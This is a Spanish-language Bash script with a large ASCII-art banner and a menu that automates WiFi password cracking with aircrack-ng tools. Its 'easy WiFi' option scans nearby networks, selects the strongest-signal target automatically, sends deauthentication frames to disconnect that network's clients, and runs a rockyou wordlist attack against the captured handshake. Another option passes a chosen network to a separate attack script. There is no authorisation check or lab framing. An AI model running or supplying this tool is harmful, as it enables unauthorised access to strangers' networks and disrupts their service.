#!/bin/bash

# Verificar si se ejecuta como root
if [[ $EUID -ne 0 ]]; then
    echo "Este script debe ejecutarse como root."
    exit 1
fi

# Función para buscar y crackear una WiFi fácil
buscar_y_crackear() {
    echo "[+] Buscando redes WiFi..."
    airmon-ng start wlan0 > /dev/null 2>&1
    timeout 10s airodump-ng wlan0mon -w scan --output-format csv > /dev/null 2>&1
    airmon-ng stop wlan0mon > /dev/null 2>&1

    # Extraer BSSID y canal de la red con mejor señal
    TARGET=$(awk -F',' 'NR>2 && $6>40 {print $1,$4}' scan-01.csv | head -n 1)
    BSSID=$(echo "$TARGET" | awk '{print $1}')
    CHANNEL=$(echo "$TARGET" | awk '{print $2}')

    if [[ -z "$BSSID" ]]; then
        echo "[-] No se encontraron redes vulnerables."
        exit 1
    fi

    echo "[+] Red encontrada: $BSSID en canal $CHANNEL"
    crackear_wifi "$BSSID" "$CHANNEL"
}

# Función para crackear una WiFi específica
crackear_wifi() {
    local BSSID=$1
    local CHANNEL=$2

    echo "[+] Capturando paquetes de $BSSID en canal $CHANNEL..."
    airmon-ng start wlan0 > /dev/null 2>&1
    airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w capture wlan0mon > /dev/null 2>&1 &
    sleep 20
    aireplay-ng --deauth 5 -a "$BSSID" wlan0mon > /dev/null 2>&1

    echo "[+] Intentando crackear la contraseña..."
    aircrack-ng -w /usr/share/wordlists/rockyou.txt -b "$BSSID" capture-01.cap
    airmon-ng stop wlan0mon > /dev/null 2>&1
}

# Menú principal

echo "                                                                                                 "  
echo "                                                                                                 "  
echo "                                                                                                 "  
echo "              :=*##%%%%%%%%%%%%##*++=:                                                           "  
echo "        .+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*=.                                                "  
echo "     :#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*:                                          "  
echo "   -%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#-                                      "  
echo "  *%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#=                                  "  
echo " -%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=                             "  
echo " =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=                        "  
echo "  +%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#-                    "  
echo "   -%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%+                 "  
echo "     =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#              "  
echo "         .-: .+-              .+#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=            "  
echo "                                        .-+*#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#          "  
echo "                                                   .=#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#          "  
echo "               .*#%%%%%%#*+:                             :#%%%%%%%%%%%%%%%%%%%%%%%%%%=         "  
echo "            =%%%%%%%%%%%%%%%%%%%%+                          *%%%%%%%%%%%%%%%%%%%%%%%%%         "  
echo "          *%%%%%%%%%%%%%%%%%%%%%%%%%%%#:                      *%%%%%%%%%%%%%%%%%%%%%%%.        "  
echo "          %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.                  :%%%%%%%%%%%%%%%%%%%%%%:        "  
echo "          %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*.                 .%%%%%%%%%%%%%%%%%%%%+        "  
echo "          #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                 =%%%%%%%%%%%%%%%%%%%:      "  
echo "          =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#                 #%%%%%%%%%%%%%%%%%=      "  
echo "             #%%%%##%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=.              .%%%%%%%%%%%%%%%%*      "  
echo "                        .-+*+%%%%%%%%%%%%%%%%%%%%%%%%%%%%-              %%%%%%%%%%%%%%%%      "  
echo "                               .#%%%%%%%%%%%%%%%%%%%%%%%%%%=             #%%%%%%%%%%%%%%*     "  
echo "                                    .#%%%%%%%%%%%%%%%%%%%%%%%:            #%%%%%%%%%%%%%#     "  
echo "                      :+%%%#%=::. -:       .*%%%%%%%%%%%%%%%%%%-           #%%%%%%%%%%%%%%    "  
echo "                    #%%%%%%%%%%%%%%%%%%+        -%%%%%%%%%%%%%%%%#:         %%%%%%%%%%%%%%    "  
echo "                    #%%%%%%%%%%%%%%%%%%%%%%*.      *%%%%%%%%%%%%%%%%%:       #%%%%%%%%%%%%    "  
echo "                    +%%%%%%%%%%%%%%%%%%%%%%%%%%=      :%%%%%%%%%%%%%%%%#      %%%%%%%%%%%%    "  
echo "                     :%%%%%%%%%%%%%%%%%%%%%%%%%%%%+        .#%%%%%%%%%%%%*     :%%%%%%%%%=    "  
echo "                        .*%%%%%%%%%%%%%%%%%%%%%%%%%%%%*-       :*%%%%%%%%%%*     %%%%%%%%     "  
echo "                             .:+%%%%%%%%%%%%%%%%%%%%%%%%%%%#:      .=%%%%%%%%     %%%%%%*     "  
echo "                                     +%%+:=#%%%%%%%%%%%%%%%%%%%%+        =%%%%-   =%%%%%=     "  
echo "                                                  .*####***#%%%%%%%:           =#  #%%%%+     "  
echo "                               ::=**-          :--:              .=*%%%+            *%%%#     "  
echo "                             .%%%%%%%%%+++*%%%%%%#%%%%%#+=.            :             %%%      "  
echo "                              %%%%%%%%%%%%%%%*.                                      =%+      "  
echo "                               %%%%%%%##.                                      #%%%- =%      "  
echo "                                                                              #%%%%%*-       "  
echo "                                                                              +%%%%%%:       "  
echo "                                                                               %%%%%%%       "  
echo "                                                                               -%%%%%%+      "  
echo "                                                                                %%%%%%%.    "  
echo "                                                                                %%%%%%%#    "  
echo "                                                                                :%%%%%%%:   "  
echo "                                                                                -%%%%%%%#   "  
echo "                                                                                 -%%%%%%%.  "  
echo "                                                                                  #%%%%%%%  "  
echo "                                                                                  -%%%%%%%- "  
echo "                                                                                   +%%%%%%%-"  
echo "                                                                                    %%%%%%%% "  
echo "                                                                                     %%%%%%%*"  
echo "                                                                                     :%%%%%%% "  
echo "                                                                                      *%%%%%%% "  
echo "                                                                                       #%%%%%%. "  
echo "                                                                                        %%%%%%= "  
echo "                                                                                        :%%%%%%: "  
echo "                                                                                        #%%%%%%+ "  
echo "                                                                                    =%%%%%%%%%%- "  
echo "                                                                  -%%%%%%       -%%%%%%%%%%%%% "  
echo "                                                          .:+%%%%%%%%%%%%+  :##%%%%%%%%%%%%#: "  
echo "                                                   .=#%%%%%%%%%%%%%%%%%%%%*=%%%%%%%%%%%%+. "  
echo "                                              .*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%- "  
echo "                                          -%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%- "  
echo "                                          =%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% "  
echo "                                           %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%= "  
echo "                                          .%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%* "  
echo "                                   .-*#%%# .%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%- "  
echo "                                *%#-   =    #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#+ "  
echo "                                :%#  =%%.   =%%%%%%%%%%%%%%%%%%%%%%%%%#=. "  
echo "                                 +%=         =%%%%%%%%%%%%%%%%%%%%=. "  
echo "                                 .%%. %%%:    *%%%%%%%%%%%%%%+ "  
echo "                                  =%%    .-#%%%%%%%%%%%%%*: "  
echo "                                   %%%%%%%#=. .%%%%%%*: "  
echo "                                    +-.        :%*. "  
echo "                                                                                                 "  
echo "                                                                                                 "  


echo "1. Buscar y crackear WiFi fácil"
echo "2. Crackear WiFi específica"
echo "3. Salir"
read -p "Selecciona una opción: " opcion

case $opcion in
    1) buscar_y_crackear ;;
    2)
        echo Pon el ESSID
        read essid
        echo Pon el canal
        read channel
        python3 essid_ataque.py --essid "$essid" -c "$channel"
        ;;
    3) exit 0 ;;
    *) echo "Opción inválida." ;;
esac
rm -f *.csv *.cap *.netxml 2>/dev/null